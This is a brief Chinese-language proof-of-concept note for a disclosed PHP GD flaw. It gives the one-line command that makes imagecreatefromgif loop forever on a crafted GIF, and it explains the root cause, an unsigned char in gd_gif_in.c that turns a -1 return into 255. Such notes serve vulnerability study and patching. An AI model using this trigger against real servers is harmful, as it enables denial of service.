依赖:
php
php*-gd
当前目录下的poc.gif

测试结果：
测试 PHP 5.5.9 成功。

POC:
php -r 'imagecreatefromgif("poc.gif");' //接下来php会在此处无限循环

原理：
http://www.freebuf.com/vuls/161262.html
据文章中所说，具体的漏洞点如下(ext/gd/libgd/gd_gif_in.c)：
380        unsigned char count;//无符号char类型数字范围是：0-255
	       ...
399        if ((count = GetDataBlock(fd, &scd->buf[2], ZeroDataBlockP)) <= 0) //然而，GetDataBlock函数会返回负-1作为结束标识，一旦返回-1，此时count将会等于255，if语句不退出，会导致之前的while死循环。

